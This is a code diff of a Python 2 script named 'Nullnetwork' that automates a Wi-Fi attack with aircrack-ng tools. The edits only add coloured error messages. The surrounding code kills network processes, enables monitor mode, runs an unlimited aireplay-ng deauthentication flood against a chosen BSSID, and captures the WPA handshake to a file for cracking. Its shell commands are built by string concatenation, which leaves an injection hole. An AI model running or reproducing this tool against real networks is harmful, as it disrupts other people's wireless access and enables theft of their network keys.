@@ -5,7 +5,7 @@ import time
 import sys
 
 class Nullnetwork:
-	
+
 	# Colors
 	BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m',
 	'\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m'
@@ -37,7 +37,7 @@ class Nullnetwork:
 			i = re.search('(w).*(:)', str).group(0)[:-1]
 			#print i.group(0)[:-1]
 		except:
-			print "No Match Found!"
+			print RED + "No Match Found!"
 			i = raw_input("Network Interface: ")
 		if "mon" in i:
 			self.monitor = i
@@ -51,7 +51,7 @@ class Nullnetwork:
 			os.system("airmon-ng check kill")
 			print "OK"
 		except:
-			print "Unable to kill process :("
+			print RED + "Unable to kill process :("
 
 
 	def startAirmon(self):
@@ -61,7 +61,7 @@ class Nullnetwork:
 				self.interface = i
 			os.system("airmon-ng start " + self.interface)
 		except:
-			print "Airmon failed to start :("
+			print RED + "Airmon failed to start :("
 
 
 	def airodump_ng(self):
@@ -80,7 +80,7 @@ class Nullnetwork:
 		try:
 			os.system("aireplay-ng -0 0 -a " + self.bssid + " " + self.monitor)
 		except:
-			print "Aireplay failed :("
+			print RED + "Aireplay failed :("
 
 
 	def getChannel(self):
@@ -94,7 +94,7 @@ class Nullnetwork:
 				+ " --bssid " + self.bssid + " -w psk "
 					+ self.monitor)
 		except:
-			print "Final Airodump failed :("
+			print RED + "Final Airodump failed :("
 #-------------------------------------------------------
 N = Nullnetwork()
 N.banner()
